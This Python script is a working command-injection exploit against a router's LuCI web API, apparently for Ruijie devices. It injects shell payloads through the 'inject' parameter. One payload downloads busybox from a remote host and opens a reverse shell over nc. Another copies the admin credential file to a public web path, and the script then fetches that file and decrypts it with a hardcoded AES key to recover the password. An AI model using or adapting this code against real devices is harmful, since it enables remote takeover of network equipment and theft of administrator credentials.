import base64
import io
import json
import multiprocessing
import re
import time
from hashlib import md5

import requests as requests
from Crypto.Cipher import AES

proxy = {
    "http": "http://127.0.0.1:8080"
}
proxy = None
# 获取反弹shell
payload1 = "'$(wget http://192.168.2.45/mips/busybox -O /tmp/busybox2;chmod 777 /tmp/busybox2;rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|/tmp/busybox2 nc 192.168.2.199 4444 >/tmp/f)'"

# dnslog
payload2 = "'$(ping xxx.domain.com)'"

# 获取密码
payload3 = "'$(cp /etc/rg_config/admin  /www/luci-static/{}/static/image/ps.png ; sleep 10 ; rm /www/luci-static/{}/static/image/ps.png)'"

payload4= "'$(touch /tmp/1231231)'"
def check(protocol,ip, port,GET_PASSWORD=True):
    payload=""
    if GET_PASSWORD:
        check_model_url="{}://{}:{}/cgi-bin/luci?stamp={}".format(protocol,ip,port,time.time())
        model=check_model(url=check_model_url)
        payload=payload3.format(model,model)
    else:
        payload=payload2
    data = {
        "method": "merge",
        "params": {
            "inject":payload,
            "password": "xxx",
            "type": "enc",
            "fromNetworkId": "xxx",
            "toNetworkId": "xxx",
            "fromSn": [],
            "esw_fromSn": []
        }
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
        "Content-Type": "application/json"
    }
    url = "{}://{}:{}/cgi-bin/luci/api/auth".format(protocol, ip, port)

    p = multiprocessing.Process(target=send_request1, args=(url, data, proxy, headers), kwargs={})
    p.start()
    if GET_PASSWORD:
        time.sleep(3)
        url = "{}://{}:{}/luci-static/{}/static/image/ps.png".format(protocol, ip, port,model)
        resp = requests.get(url)
        print(resp.text)
        print(decrypt_string(resp.text.strip("\n")))
        p.terminate()



def send_request1(url, data, proxy, headers):
    resp = requests.post(url, data=json.dumps(data), proxies=proxy, headers=headers)
    print("{} {} ".format(resp.status_code, resp.text))


def derive_key_and_iv(password, salt, key_length, iv_length):
    d = d_i = b''
    while len(d) < key_length + iv_length:
        d_i = md5(d_i + bytes(password, encoding="ascii") + salt).digest()
        d += d_i
    return d[:key_length], d[key_length:key_length + iv_length]


def decrypt(in_file, out_file, password, key_length=32):
    bs = AES.block_size
    salt = in_file.read(bs)[len('Salted__'):]
    key, iv = derive_key_and_iv(password, salt, key_length, bs)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    next_chunk = b''
    finished = False
    while not finished:
        chunk, next_chunk = next_chunk, cipher.decrypt(in_file.read(1 * bs))
        if len(next_chunk) == 0:
            padding_length = chunk[-1]
            chunk = chunk[:-padding_length]
            finished = True
        out_file.write(chunk)


# echo U2FsdGVkX18k2P8TwVpi+gwfVzrdkIutRQA2OEzqeEM=| openssl enc -aes-256-cbc -d -a -md md5 -k "RjYkhwzx\$2018!"
def decrypt_string(string):
    pas = string
    inio = io.BytesIO(base64.b64decode(pas))
    outio = io.BytesIO()
    decrypt(inio, outio, "RjYkhwzx$2018!")
    outio.seek(0)
    plaint = str(outio.read(), encoding="ascii")
    return plaint



def check_model(url):
    resp=requests.get(url)
    print(re.findall('/luci-static/(.*)/static',resp.text)[0])
    return re.findall('/luci-static/(.*)/static',resp.text)[0]

if __name__ == "__main__":
    #check("http", "192.168.110.1", "80")
    check("http", "192.168.2.20", "80")
    #check_model(url)
    # check("http","221.1.201.226","8888")
